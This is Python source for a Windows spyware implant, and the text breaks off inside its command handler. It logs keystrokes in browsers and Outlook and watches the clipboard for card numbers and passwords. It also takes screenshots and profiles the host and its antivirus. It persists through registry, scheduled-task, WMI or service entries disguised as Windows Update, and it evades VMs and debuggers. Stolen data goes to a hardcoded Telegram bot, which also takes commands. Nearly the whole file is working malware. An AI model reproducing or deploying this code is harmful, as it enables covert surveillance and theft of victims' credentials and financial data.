import os
import sys
import json
import base64
import ctypes
import threading
import tempfile
import datetime
import time
import platform
import winreg
import subprocess
import psutil
import socket
import uuid
import random
import zlib
import re
import requests
import win32clipboard
import win32con
import win32api
import win32gui
import html
import sqlite3
from PIL import ImageGrab, Image, ImageDraw, ImageFont
from cryptography.fernet import Fernet
from pynput import keyboard
import mss
import mss.tools

TELEGRAM_BOT_TOKEN = '8316232122:AAGo_NLDpLrOP19aqDNciqbZpJgiSZJ2alo'
TELEGRAM_CHAT_ID = '6563668561'
ENCRYPTION_KEY = Fernet.generate_key()
PERSISTENCE_METHOD = "wmi"
SCREENSHOT_INTERVAL = 180
KEYLOG_INTERVAL = 240
HEARTBEAT_INTERVAL = 900
COMMAND_POLL_INTERVAL = 5
CLIPBOARD_CHECK_INTERVAL = 300
MEMORY_CHECK_INTERVAL = 90
MAX_KEYSTROKES = 500
MEMORY_THRESHOLD = 50
JITTER_FACTOR = 0.3
ANTI_ANALYSIS_ENABLED = True
CLIPBOARD_MONITORING_ENABLED = True
SELECTIVE_KEYLOGGING_ENABLED = True
TARGET_APPS = ["chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe", "outlook.exe", "brave.exe", "opera.exe", "vivaldi.exe"]
BUSINESS_HOURS_START = 9
BUSINESS_HOURS_END = 17
USER_ACTIVITY_THRESHOLD = 5
PRIORITY_DATA_TYPES = ["credentials", "clipboard_sensitive", "keystrokes_passwords"]
user_activity_count = 0
last_activity_time = time.time()
transmission_queue = []

LOG_FILE = os.path.join(tempfile.gettempdir(), "system_log.log")
DB_FILE = os.path.join(tempfile.gettempdir(), "system.db")

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS keystrokes (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, window TEXT, key TEXT)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS clipboard (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, content TEXT, sensitive INTEGER)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS screenshots (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, filepath TEXT)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS victims (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT UNIQUE, first_seen TEXT, last_seen TEXT, status TEXT, system_info TEXT, geolocation TEXT)''')
    conn.commit()
    conn.close()

init_db()

def escape_html(text):
    return html.escape(text)

def anti_analysis_checks():
    if not ANTI_ANALYSIS_ENABLED:
        return False
    
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except:
        pass
    
    vm_indicators = [
        "VBox", "VMware", "VirtualBox", "QEMU", "Xen", "KVM",
        "VIRTUAL", "vmware", "vbox", "qemu", "sandbox", "malware"
    ]
    
    try:
        system_info = platform.system() + " " + platform.release()
        for indicator in vm_indicators:
            if indicator.lower() in system_info.lower():
                return True
    except:
        pass
    
    try:
        hostname = socket.gethostname()
        for indicator in vm_indicators:
            if indicator.lower() in hostname.lower():
                return True
    except:
        pass
    
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
        if any(vm_mac in mac for vm_mac in ["08:00:27", "00:0C:29", "00:1C:14", "00:50:56"]):
            return True
    except:
        pass
    
    analysis_processes = [
        "wireshark.exe", "fiddler.exe", "processhacker.exe", 
        "procmon.exe", "ida.exe", "ollydbg.exe", "x64dbg.exe",
        "immunitydebugger.exe", "windbg.exe", "vboxservice.exe",
        "vmtoolsd.exe", "vmwareuser.exe"
    ]
    
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in analysis_processes:
                return True
    except:
        pass
    
    vm_files = [
        r"C:\Windows\System32\drivers\VBoxMouse.sys",
        r"C:\Windows\System32\drivers\VBoxGuest.sys",
        r"C:\Windows\System32\drivers\vmhgfs.sys",
        r"C:\Windows\System32\drivers\vmmemctl.sys"
    ]
    
    for file_path in vm_files:
        if os.path.exists(file_path):
            return True
    
    return False

class VictimTracker:
    def __init__(self):
        self.victim_id = self.generate_victim_id()
        self.session_start = datetime.datetime.now(datetime.timezone.utc)
        self.last_activity = datetime.datetime.now(datetime.timezone.utc)
        self.status = "active"
        self.activity_count = {
            'screenshots': 0,
            'keylogs': 0,
            'system_reports': 0,
            'clipboard_logs': 0,
            'commands_executed': 0
        }
        self.geolocation = self.get_geolocation()
        
        system_info = {
            'system': platform.system(),
            'node': platform.node(),
            'release': platform.release(),
            'machine': platform.machine()
        }
        self.update_victim_status("active", system_info, self.geolocation)
    
    def generate_victim_id(self):
        system_info = f"{platform.system()}-{platform.node()}-{uuid.getnode()}"
        return base64.b64encode(system_info.encode()).decode()[:10]
    
    def get_geolocation(self):
        try:
            response = requests.get('https://ipinfo.io/json', timeout=5)
            if response.status_code == 200:
                data = response.json()
                return {
                    'ip': data.get('ip', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'region': data.get('region', 'Unknown'),
                    'country': data.get('country', 'Unknown'),
                    'org': data.get('org', 'Unknown')
                }
        except:
            pass
        return {
            'ip': 'Unknown',
            'city': 'Unknown',
            'region': 'Unknown',
            'country': 'Unknown',
            'org': 'Unknown'
        }
    
    def update_activity(self, activity_type):
        self.last_activity = datetime.datetime.now(datetime.timezone.utc)
        if activity_type in self.activity_count:
            self.activity_count[activity_type] += 1
        
        self.update_victim_status("active")
    
    def update_victim_status(self, status, system_info=None, geolocation=None):
        try:
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM victims WHERE victim_id = ?", (self.victim_id,))
            victim = cursor.fetchone()
            
            if victim:
                cursor.execute(
                    "UPDATE victims SET last_seen = ?, status = ?, system_info = ?, geolocation = ? WHERE victim_id = ?",
                    (datetime.datetime.now().isoformat(), status, json.dumps(system_info), json.dumps(geolocation), self.victim_id)
                )
            else:
                cursor.execute(
                    "INSERT INTO victims (victim_id, first_seen, last_seen, status, system_info, geolocation) VALUES (?, ?, ?, ?, ?, ?)",
                    (self.victim_id, datetime.datetime.now().isoformat(), datetime.datetime.now().isoformat(), status, 
                     json.dumps(system_info), json.dumps(geolocation))
                )
            
            conn.commit()
            conn.close()
        except Exception as e:
            pass
    
    def get_uptime(self):
        uptime = datetime.datetime.now(datetime.timezone.utc) - self.session_start
        hours, remainder = divmod(uptime.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours}h {minutes}m {seconds}s"
    
    def get_status_report(self):
        return {
            'victim_id': self.victim_id,
            'status': self.status,
            'uptime': self.get_uptime(),
            'last_activity': self.last_activity.isoformat(),
            'activity_count': self.activity_count,
            'memory_usage': f"{psutil.virtual_memory().percent}%",
            'cpu_usage': f"{psutil.cpu_percent()}%",
            'geolocation': self.geolocation
        }

def set_persistence():
    app_name = "WindowsUpdateHelper.exe"
    exe_path = os.path.join(os.getenv('APPDATA'), app_name)
    
    if not os.path.exists(exe_path):
        with open(__file__, 'r') as f:
            script_content = f.read()
        with open(exe_path, 'w') as f:
            f.write(script_content)
    
    try:
        if PERSISTENCE_METHOD == "registry":
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
        
        elif PERSISTENCE_METHOD == "startup":
            startup_path = os.path.join(os.getenv('APPDATA'), 
                                      'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            if not os.path.exists(os.path.join(startup_path, app_name)):
                os.symlink(exe_path, os.path.join(startup_path, app_name))
        
        elif PERSISTENCE_METHOD == "task":
            subprocess.run(f'schtasks /create /tn "WindowsUpdateTask" /tr "{exe_path}" /sc onlogon /rl highest /f', 
                          shell=True, capture_output=True)
        
        elif PERSISTENCE_METHOD == "wmi":
            wmi_command = f"""
            $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
                EventNamespace = "root\\cimv2";
                QueryLanguage = "WQL";
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
                Name = "WindowsUpdateFilter";
                EventNameSpace = "root\\cimv2";
            }}
            
            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
                Name = "WindowsUpdateConsumer";
                ExecutablePath = "{exe_path}";
            }}
            
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
                Filter = $filter;
                Consumer = $consumer;
            }}
            """
            subprocess.run(["powershell", "-Command", wmi_command], capture_output=True)
        
        elif PERSISTENCE_METHOD == "service":
            service_name = "WindowsUpdateService"
            service_cmd = f'sc create {service_name} binPath= "{exe_path}" start= auto DisplayName= "Windows Update Service"'
            subprocess.run(service_cmd, shell=True, capture_output=True)
            subprocess.run(f'sc description {service_name} "Provides Windows Update services"', shell=True, capture_output=True)
            subprocess.run(f'sc start {service_name}', shell=True, capture_output=True)
    
    except Exception as e:
        pass

def check_memory_usage():
    memory_percent = psutil.virtual_memory().percent
    if memory_percent > MEMORY_THRESHOLD:
        global SCREENSHOT_INTERVAL, KEYLOG_INTERVAL
        SCREENSHOT_INTERVAL = min(SCREENSHOT_INTERVAL * 2, 600)
        KEYLOG_INTERVAL = min(KEYLOG_INTERVAL * 2, 900)
        return True
    return False

def apply_jitter(base_interval):
    jitter = base_interval * JITTER_FACTOR
    return base_interval + random.uniform(-jitter, jitter)

def is_business_hours():
    hour = datetime.datetime.now().hour
    return BUSINESS_HOURS_START <= hour <= BUSINESS_HOURS_END

def get_dynamic_interval(base_interval):
    if is_business_hours():
        return base_interval * 0.8
    else:
        return base_interval * 1.2

def get_user_activity_level():
    global user_activity_count, last_activity_time
    
    if time.time() - last_activity_time > 60:
        user_activity_count = 0
        last_activity_time = time.time()
    
    return user_activity_count

def adjust_intervals_based_on_activity():
    if get_user_activity_level() > USER_ACTIVITY_THRESHOLD:
        global SCREENSHOT_INTERVAL, KEYLOG_INTERVAL
        SCREENSHOT_INTERVAL = max(SCREENSHOT_INTERVAL * 0.7, 60)
        KEYLOG_INTERVAL = max(KEYLOG_INTERVAL * 0.7, 120)

def should_transmit_immediately(data_type):
    return data_type in PRIORITY_DATA_TYPES

def encrypt_data(data):
    cipher = Fernet(ENCRYPTION_KEY)
    if isinstance(data, str):
        data = data.encode()
    compressed = zlib.compress(data)
    return cipher.encrypt(compressed)

def decrypt_data(encrypted_data):
    cipher = Fernet(ENCRYPTION_KEY)
    decompressed = zlib.decompress(cipher.decrypt(encrypted_data))
    return decompressed.decode()

def send_to_telegram(message_type, data=None, filename=None, victim_tracker=None):
    try:
        if victim_tracker:
            victim_tracker.update_activity(message_type.split('_')[0])
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        if filename:
            with open(filename, 'rb') as f:
                response = requests.post(
                    f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument',
                    data={'chat_id': TELEGRAM_CHAT_ID},
                    files={'document': f},
                    headers=headers
                )
            os.remove(filename)
            return response.status_code == 200
        else:
            response = requests.post(
                f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
                json={'chat_id': TELEGRAM_CHAT_ID, 'text': data, 'parse_mode': 'HTML'},
                headers=headers
            )
            return response.status_code == 200
    
    except Exception as e:
        return False

class AdvancedKeylogger:
    def __init__(self, victim_tracker):
        self.keystrokes = []
        self.listener = None
        self.last_sent = datetime.datetime.now(datetime.timezone.utc)
        self.victim_tracker = victim_tracker
        self.current_window = ""
        self.window_history = []
    
    def on_press(self, key):
        global user_activity_count, last_activity_time
        
        user_activity_count += 1
        last_activity_time = time.time()
        
        try:
            if SELECTIVE_KEYLOGGING_ENABLED:
                active_window = self.get_active_window()
                if active_window != self.current_window:
                    self.current_window = active_window
                    if not any(target.lower() in active_window.lower() for target in TARGET_APPS):
                        return
            
            try:
                k = key.char
            except AttributeError:
                k = f'[{key.name}]'
            
            timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%H:%M:%S")
            self.keystrokes.append({
                'timestamp': timestamp,
                'window': self.current_window,
                'key': k
            })
            
            now = datetime.datetime.now(datetime.timezone.utc)
            dynamic_interval = get_dynamic_interval(KEYLOG_INTERVAL)
            if (len(self.keystrokes) >= MAX_KEYSTROKES or 
                (now - self.last_sent).total_seconds() >= apply_jitter(dynamic_interval)):
                self.send_report()
        except:
            pass
    
    def send_report(self):
        if not self.keystrokes:
            return
        
        formatted_keystrokes = self.format_keystrokes()
        
        report = {
            'victim_id': self.victim_tracker.victim_id,
            'keystrokes': formatted_keystrokes,
            'count': len(self.keystrokes),
            'timestamp': datetime.datetime.now(datetime.timezone.utc).isoformat()
        }
        
        message = "<b>🔑 Keylogger Report</b>\n\n"
        message += f"<b>Victim ID:</b> <code>{escape_html(report['victim_id'])}</code>\n"
        message += f"<b>Timestamp:</b> <code>{escape_html(report['timestamp'])}</code>\n"
        message += f"<b>Keystrokes Count:</b> <code>{escape_html(str(report['count']))}</code>\n\n"
        message += f"<pre>{escape_html(formatted_keystrokes)}</pre>"
        
        if self.is_sensitive_keystrokes(formatted_keystrokes):
            send_to_telegram('keystrokes_passwords', message, victim_tracker=self.victim_tracker)
        else:
            send_to_telegram('keylog_report', message, victim_tracker=self.victim_tracker)
        
        self.keystrokes = []
        self.last_sent = datetime.datetime.now(datetime.timezone.utc)
    
    def format_keystrokes(self):
        formatted = ""
        current_window = None
        window_buffer = []
        
        for entry in self.keystrokes:
            if entry['window'] != current_window:
                if window_buffer:
                    formatted += f"\n[{current_window}]\n"
                    formatted += "".join(window_buffer)
                    window_buffer = []
                current_window = entry['window']
            
            window_buffer.append(entry['key'])
            
            if entry['key'] in ['[space]', '[enter]', '[tab]']:
                window_buffer.append(' ')
        
        if window_buffer:
            formatted += f"\n[{current_window}]\n"
            formatted += "".join(window_buffer)
        
        return formatted.strip()
    
    def is_sensitive_keystrokes(self, text):
        sensitive_patterns = [
            r'\bpassword\s*[:=]\s*\S+',
            r'\bpwd\s*[:=]\s*\S+',
            r'\bpass\s*[:=]\s*\S+',
            r'\blogin\s*[:=]\s*\S+',
            r'\bsignin\s*[:=]\s*\S+',
            r'\bcredential\s*[:=]\s*\S+'
        ]
        
        for pattern in sensitive_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        
        sensitive_keywords = [
            'credit card', 'cvv', 'expiration', 'security code',
            'ssn', 'social security', 'bank account', 'routing number',
            'api key', 'secret key', 'access token', 'private key'
        ]
        
        for keyword in sensitive_keywords:
            if keyword.lower() in text.lower():
                return True
        
        return False
    
    def get_active_window(self):
        try:
            if platform.system() == 'Windows':
                hwnd = win32gui.GetForegroundWindow()
                length = win32gui.GetWindowTextLengthW(hwnd)
                buff = win32gui.CreateUnicodeBuffer(length + 1)
                win32gui.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value
        except:
            return "Unknown"
    
    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        threading.Thread(target=self.periodic_send, daemon=True).start()
    
    def periodic_send(self):
        while True:
            dynamic_interval = get_dynamic_interval(KEYLOG_INTERVAL)
            time.sleep(apply_jitter(dynamic_interval))
            self.send_report()

class ClipboardMonitor:
    def __init__(self, victim_tracker):
        self.victim_tracker = victim_tracker
        self.last_clipboard = ""
        self.clipboard_lock = threading.Lock()
    
    def start(self):
        if not CLIPBOARD_MONITORING_ENABLED:
            return
        
        threading.Thread(target=self.monitor_loop, daemon=True).start()
    
    def monitor_loop(self):
        while True:
            try:
                dynamic_interval = get_dynamic_interval(CLIPBOARD_CHECK_INTERVAL)
                time.sleep(apply_jitter(dynamic_interval))
                
                data = self.get_clipboard_data()
                
                if data and data != self.last_clipboard:
                    self.last_clipboard = data
                    
                    sensitive = self.is_sensitive_data(data)
                    
                    message = "<b>📋 Clipboard Monitor</b>\n\n"
                    message += f"<b>Victim ID:</b> <code>{escape_html(self.victim_tracker.victim_id)}</code>\n"
                    message += f"<b>Timestamp:</b> <code>{escape_html(datetime.datetime.now(datetime.timezone.utc).isoformat())}</code>\n"
                    message += f"<b>Sensitive Data:</b> <code>{'Yes' if sensitive else 'No'}</code>\n\n"
                    message += f"<pre>{escape_html(data)}</pre>"
                    
                    if sensitive:
                        send_to_telegram('clipboard_sensitive', message, victim_tracker=self.victim_tracker)
                    else:
                        send_to_telegram('clipboard_log', message, victim_tracker=self.victim_tracker)
            except Exception as e:
                pass
    
    def get_clipboard_data(self):
        with self.clipboard_lock:
            try:
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                return data
            except Exception:
                try:
                    win32clipboard.CloseClipboard()
                except:
                    pass
                return None
    
    def is_sensitive_data(self, text):
        credit_card_pattern = r'\b(?:\d[ -]*?){13,16}\b'
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        password_patterns = [
            r'\bpassword\s*[:=]\s*\S+',
            r'\bpwd\s*[:=]\s*\S+',
            r'\bpass\s*[:=]\s*\S+',
            r'\blogin\s*[:=]\s*\S+',
            r'\bsignin\s*[:=]\s*\S+',
            r'\bcredential\s*[:=]\s*\S+'
        ]
        
        if re.search(credit_card_pattern, text):
            return True
        
        if re.search(email_pattern, text):
            return True
        
        for pattern in password_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        
        sensitive_keywords = [
            'credit card', 'cvv', 'expiration', 'security code',
            'ssn', 'social security', 'bank account', 'routing number',
            'api key', 'secret key', 'access token', 'private key'
        ]
        
        for keyword in sensitive_keywords:
            if keyword.lower() in text.lower():
                return True
        
        return False

class StealthScreenshotCapture:
    def __init__(self, victim_tracker):
        self.last_capture = datetime.datetime.now(datetime.timezone.utc)
        self.victim_tracker = victim_tracker
    
    def capture(self):
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                
                img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
                draw = ImageDraw.Draw(img)
                
                try:
                    font = ImageFont.truetype("arial.ttf", 16)
                except:
                    font = ImageFont.load_default()
                
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                draw.text((10, 10), f"Victim: {self.victim_tracker.victim_id} | {timestamp}", 
                         fill="red", font=font)
                
                temp_file = os.path.join(tempfile.gettempdir(), f'ss_{int(time.time())}.png')
                img.save(temp_file)
                return temp_file
        except Exception:
            return None
    
    def start(self):
        threading.Thread(target=self.capture_loop, daemon=True).start()
    
    def capture_loop(self):
        while True:
            now = datetime.datetime.now(datetime.timezone.utc)
            dynamic_interval = get_dynamic_interval(SCREENSHOT_INTERVAL)
            
            if (now - self.last_capture).total_seconds() >= apply_jitter(dynamic_interval):
                if not check_memory_usage():
                    screenshot_file = self.capture()
                    if screenshot_file:
                        caption = f"<b>📸 Screenshot</b>\n\n"
                        caption += f"<b>Victim ID:</b> <code>{escape_html(self.victim_tracker.victim_id)}</code>\n"
                        caption += f"<b>Timestamp:</b> <code>{escape_html(datetime.datetime.now(datetime.timezone.utc).isoformat())}</code>"
                        
                        self.send_screenshot_with_caption(screenshot_file, caption)
                        self.last_capture = now
            time.sleep(10)
    
    def send_screenshot_with_caption(self, filename, caption):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            with open(filename, 'rb') as f:
                response = requests.post(
                    f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument',
                    data={
                        'chat_id': TELEGRAM_CHAT_ID,
                        'caption': caption,
                        'parse_mode': 'HTML'
                    },
                    files={'document': f},
                    headers=headers
                )
            
            os.remove(filename)
            return response.status_code == 200
        except Exception as e:
            return False

class SystemMonitor:
    def __init__(self, victim_tracker):
        self.start_time = datetime.datetime.now(datetime.timezone.utc)
        self.victim_tracker = victim_tracker
    
    def collect_system_info(self):
        try:
            info = {
                'victim_id': self.victim_tracker.victim_id,
                'system': platform.system(),
                'node': platform.node(),
                'release': platform.release(),
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor(),
                'uptime': str(datetime.datetime.now(datetime.timezone.utc) - self.start_time),
                'memory': self.get_memory_usage(),
                'disk': self.get_disk_usage(),
                'network': self.get_network_info(),
                'users': self.get_logged_in_users(),
                'antivirus': self.get_antivirus_status(),
                'processes': self.get_running_processes(),
                'geolocation': self.victim_tracker.geolocation,
                'timestamp': datetime.datetime.now(datetime.timezone.utc).isoformat()
            }
            return info
        except:
            return {}
    
    def get_memory_usage(self):
        try:
            mem = psutil.virtual_memory()
            return {
                'total': self.format_bytes(mem.total),
                'available': self.format_bytes(mem.available),
                'percent': f"{mem.percent}%",
                'used': self.format_bytes(mem.used)
            }
        except:
            return {}
    
    def get_disk_usage(self):
        try:
            disk = psutil.disk_usage('/')
            return {
                'total': self.format_bytes(disk.total),
                'used': self.format_bytes(disk.used),
                'free': self.format_bytes(disk.free),
                'percent': f"{disk.percent}%"
            }
        except:
            return {}
    
    def get_network_info(self):
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            return {
                'hostname': hostname,
                'ip_address': ip_address
            }
        except:
            return {}
    
    def get_logged_in_users(self):
        try:
            return [user.name for user in psutil.users()]
        except:
            return [os.getlogin()]
    
    def get_antivirus_status(self):
        try:
            av_processes = ['MsMpEng.exe', 'avastui.exe', 'avgui.exe', 'bdagent.exe', 'egui.exe']
            running_av = []
            
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] in av_processes:
                    running_av.append(proc.info['name'])
            
            return {
                'running_antivirus': running_av,
                'windows_defender': 'active' if 'MsMpEng.exe' in running_av else 'inactive'
            }
        except:
            return {}
    
    def get_running_processes(self):
        try:
            processes = []
            for proc in psutil.process_iter(['name', 'pid', 'username', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append({
                        'name': proc.info['name'],
                        'pid': proc.info['pid'],
                        'username': proc.info['username'],
                        'cpu': f"{proc.info['cpu_percent']:.1f}%",
                        'memory': f"{proc.info['memory_percent']:.1f}%"
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            
            processes.sort(key=lambda x: float(x['memory'].replace('%', '')), reverse=True)
            return processes[:20]
        except:
            return []
    
    def format_bytes(self, bytes_value):
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if bytes_value < 1024.0:
                return f"{bytes_value:.2f} {unit}"
            bytes_value /= 1024.0
        return f"{bytes_value:.2f} PB"
    
    def start(self):
        threading.Thread(target=self.periodic_report, daemon=True).start()
    
    def periodic_report(self):
        while True:
            dynamic_interval = get_dynamic_interval(HEARTBEAT_INTERVAL)
            time.sleep(apply_jitter(dynamic_interval))
            sys_info = self.collect_system_info()
            
            message = self.format_system_info(sys_info)
            send_to_telegram('system_report', message, victim_tracker=self.victim_tracker)
    
    def format_system_info(self, info):
        message = "<b>🖥️ System Information</b>\n\n"
        message += f"<b>Victim ID:</b> <code>{escape_html(info['victim_id'])}</code>\n"
        message += f"<b>Timestamp:</b> <code>{escape_html(info['timestamp'])}</code>\n\n"
        
        message += "<b>🌐 System Details:</b>\n"
        message += f"• <b>OS:</b> <code>{escape_html(info['system'] + ' ' + info['release'])}</code>\n"
        message += f"• <b>Hostname:</b> <code>{escape_html(info['node'])}</code>\n"
        message += f"• <b>Machine:</b> <code>{escape_html(info['machine'])}</code>\n"
        message += f"• <b>Processor:</b> <code>{escape_html(info['processor'])}</code>\n"
        message += f"• <b>Uptime:</b> <code>{escape_html(info['uptime'])}</code>\n\n"
        
        message += "<b>💾 Memory Usage:</b>\n"
        message += f"• <b>Total:</b> <code>{escape_html(info['memory']['total'])}</code>\n"
        message += f"• <b>Used:</b> <code>{escape_html(info['memory']['used'] + ' (' + info['memory']['percent'] + ')')}</code>\n"
        message += f"• <b>Available:</b> <code>{escape_html(info['memory']['available'])}</code>\n\n"
        
        message += "<b>💿 Disk Usage:</b>\n"
        message += f"• <b>Total:</b> <code>{escape_html(info['disk']['total'])}</code>\n"
        message += f"• <b>Used:</b> <code>{escape_html(info['disk']['used'] + ' (' + info['disk']['percent'] + ')')}</code>\n"
        message += f"• <b>Free:</b> <code>{escape_html(info['disk']['free'])}</code>\n\n"
        
        message += "<b>🌐 Network:</b>\n"
        message += f"• <b>Hostname:</b> <code>{escape_html(info['network']['hostname'])}</code>\n"
        message += f"• <b>IP Address:</b> <code>{escape_html(info['network']['ip_address'])}</code>\n\n"
        
        message += "<b>👥 Users:</b>\n"
        for user in info['users']:
            message += f"• <code>{escape_html(user)}</code>\n"
        message += "\n"
        
        message += "<b>🛡️ Security:</b>\n"
        message += f"• <b>Windows Defender:</b> <code>{escape_html(info['antivirus']['windows_defender'])}</code>\n"
        if info['antivirus']['running_antivirus']:
            message += f"• <b>Other AV:</b> <code>{escape_html(', '.join(info['antivirus']['running_antivirus']))}</code>\n"
        message += "\n"
        
        message += "<b>🌍 Location:</b>\n"
        message += f"• <b>IP:</b> <code>{escape_html(info['geolocation']['ip'])}</code>\n"
        message += f"• <b>City:</b> <code>{escape_html(info['geolocation']['city'])}</code>\n"
        message += f"• <b>Region:</b> <code>{escape_html(info['geolocation']['region'])}</code>\n"
        message += f"• <b>Country:</b> <code>{escape_html(info['geolocation']['country'])}</code>\n"
        message += f"• <b>Organization:</b> <code>{escape_html(info['geolocation']['org'])}</code>\n\n"
        
        message += "<b>📊 Top Processes:</b>\n"
        for proc in info['processes'][:5]:
            message += f"• <code>{escape_html(proc['name'])}</code> (PID: <code>{escape_html(str(proc['pid']))}</code>) | CPU: <code>{escape_html(proc['cpu'])}</code> | Memory: <code>{escape_html(proc['memory'])}</code>\n"
        
        return message

class CommandHandler:
    def __init__(self, victim_tracker, keylogger, screenshot_capture, system_monitor):
        self.victim_tracker = victim_tracker
        self.keylogger = keylogger
        self.screenshot_capture = screenshot_capture
        self.system_monitor = system_monitor
        self.last_update_id = 0
        self.commands = {
            '/screenshot': self.cmd_screenshot,
            '/keystrokes': self.cmd_keystrokes,
            '/system': self.cmd_system,
            '/processes': self.cmd_processes,
            '/clipboard': self.cmd_clipboard,
            '/status': self.cmd_status,
            '/victims': self.cmd_victims,
            '/help': self.cmd_help,
            '/exit': self.cmd_exit
        }
    
    def start(self):
        threading.Thread(target=self.poll_commands, daemon=True).start()
    
    def poll_commands(self):
        while True:
            try:
                updates = self.get_updates()
                if updates and 'result' in updates:
                    for update in updates['result']:
                        if update['update_id'] > self.last_update_id:
                            self.last_update_id = update['update_id']
                            if 'message' in update and 'text' in update['message']:
                                self.process_command(update['message']['text'])
            except:
                pass
            time.sleep(COMMAND_POLL_INTERVAL)
    
    def get_updates(self):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {'timeout': 10, 'offset': self.last_update_id + 1}
            response = requests.get(url, params=params, timeout=15)
            if response.status_code == 200:
                return response.json()
        except:
            pass
        return None
    
    def process_command(self, command_text):
        command = command_text.split()[0].lower()
        if command in self.commands:
            self.commands[command]()
            self.victim_tracker.update_activity('commands_executed')
    
    def cmd_screenshot(self):
        screenshot_file = self.screenshot_capture.capture()
        if screenshot_file:
            caption = f"<b>📸 Requested Screenshot</b>\n\n"
            caption += f"<b>Victim ID:</b> <code>{escape_html(self.victim_tracker.victim_id)}</code>\n"
            caption += f"<b>Timestamp:</b> <code>{escape_html(datetime.datetime.now(datetime.timezone.utc).isoformat())}</code>"
            
            self.screenshot_capture.send_screenshot_with_caption(screenshot_file, caption)
        else:
            send_to_telegram('error', "<b>❌ Failed to capture screenshot</b>", victim_tracker=self.victim_tracker)
    
    def cmd_keystrokes(self):
        if self.keylogger.keystrokes:
            formatted_keystrokes = self.keylogger.format_keystrokes()
            
            message = "<b>🔑 Requested Keystrokes</b>\n\n"
            message += f"<b>Victim ID:</b> <code>{escape_html(self.victim_tracker.victim_id)}</code>\n"
            message += f"<b>Timestamp:</b> <code>{escape_html(datetime.datetime.now(datetime.timezone.utc).isoformat())}</code>\n"
            message += f"<b>Keystrokes Count:</b> <code>{escape_html(str(len(self.keylogger.keystrokes)))}</code>\n\n"
            message += f"<pre>{escape_html(formatted_keystrokes)}</pre>"
            
            send_to_telegram('keystrokes', message, victim_tracker=self.victim_tracker)
        else:
            send_to_telegram('info', "<b>ℹ️ No keystrokes recorded yet</b>", victim_tracker=self.victim_tracker)
    
    def cmd_system(self):
        sys_info = self.system_monitor.collect_system_info()
        message = self.system_monitor.format_system_info(sys_info)
        send_to_telegram('system', message, victim_tracker=self.victim_tracker)
    
    def cmd_processes(self):
        processes = self.system_monitor.get_running_processes()
        
        message = "<b>⚙️ Running Processes</b>\n\n"
        message += f"<b>Victim ID:</b> <code>{escape_html(self.victim_tracker.victim_id)}</code>\n"
